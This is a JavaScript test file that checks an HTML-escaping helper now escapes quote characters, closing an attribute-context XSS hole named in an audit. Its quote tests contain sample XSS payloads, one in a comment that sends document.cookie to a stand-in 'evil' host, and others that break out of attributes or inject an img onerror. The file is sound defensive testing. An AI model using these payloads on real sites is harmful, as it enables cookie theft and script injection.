// dom-utils tests — escapeHtml() attribute-safety contract.
//
// Audit M7: escapeHtml() previously serialized via element.innerHTML, which per
// the HTML spec escapes only & < > (text-node context) and leaves " and ' raw.
// That output is safe inside element text but an injection vector wherever it's
// interpolated into a QUOTED HTML attribute (aria-label, title, data-*, value=),
// which is the dominant interpolation pattern in this codebase. These tests lock
// in that the helper now also escapes both quote characters, closing the whole
// attribute-context XSS class — and that it stays correct in text context.
//
// escapeHtml is a global from js/dom-utils.js (loaded in tests/index.html).

describe('escapeHtml — element-text-context characters (unchanged)', () => {
  it('escapes & < >', () => {
    assertEqual(escapeHtml('a & b'), 'a &amp; b');
    assertEqual(escapeHtml('<script>'), '&lt;script&gt;');
    assertEqual(escapeHtml('1 < 2 > 0'), '1 &lt; 2 &gt; 0');
  });

  it('does not double-escape: a literal ampersand becomes exactly one entity', () => {
    // & must be replaced FIRST, else the & in &lt;/&quot;/etc. would re-escape.
    assertEqual(escapeHtml('&'), '&amp;');
    assertEqual(escapeHtml('&amp;'), '&amp;amp;');   // the user's literal text, faithfully escaped once
    assertEqual(escapeHtml('<&>'), '&lt;&amp;&gt;');
  });
});

describe('escapeHtml — quote characters (the M7 fix)', () => {
  it('escapes the double quote to &quot;', () => {
    assertEqual(escapeHtml('5\'2"'), '5&#39;2&quot;');
    assertEqual(escapeHtml('say "hi"'), 'say &quot;hi&quot;');
  });

  it('escapes the single quote / apostrophe to &#39;', () => {
    assertEqual(escapeHtml("O'Brien"), 'O&#39;Brien');
    assertEqual(escapeHtml("it's"), 'it&#39;s');
  });

  it('output of a quote-bearing value contains no raw " or \' (cannot break a quoted attribute)', () => {
    // The attack: a synced tag / Todoist text / med name like
    //   " onpointerover="fetch('//evil?'+document.cookie)
    // interpolated into  <button data-tag="${escapeHtml(tag)}">.
    const hostile = '" onpointerover="alert(document.cookie)"';
    const out = escapeHtml(hostile);
    assertEqual(out.includes('"'), false, 'no raw double quote may survive');
    assertEqual(out.includes("'"), false, 'no raw single quote may survive');
    // The angle/amp are also covered, so the value is inert in every context.
    assertEqual(out, '&quot; onpointerover=&quot;alert(document.cookie)&quot;');
  });

  it('a value that round-trips through a quoted attribute stays a string, not markup', () => {
    // Build the exact innerHTML the UI code builds, parse it, and assert the
    // attribute value reads back verbatim with no injected attributes/nodes.
    const tag = '"><img src=x onerror=alert(1)>';
    const host = document.createElement('div');
    host.innerHTML = `<button data-tag="${escapeHtml(tag)}">x</button>`;
    const btn = host.querySelector('button');
    assert(btn !== null, 'the button must parse as a single element');
    assertEqual(host.querySelectorAll('img').length, 0, 'no <img> may be injected');
    assertEqual(btn.getAttribute('data-tag'), tag, 'attribute reads back as the literal string');
  });
});

describe('escapeHtml — null-safety (preserved)', () => {
  it('maps undefined / null to empty string, not the literal word', () => {
    assertEqual(escapeHtml(undefined), '');
    assertEqual(escapeHtml(null), '');
  });

  it('coerces non-strings to their String() form', () => {
    assertEqual(escapeHtml(42), '42');
    assertEqual(escapeHtml(0), '0');
    assertEqual(escapeHtml(true), 'true');
  });
});
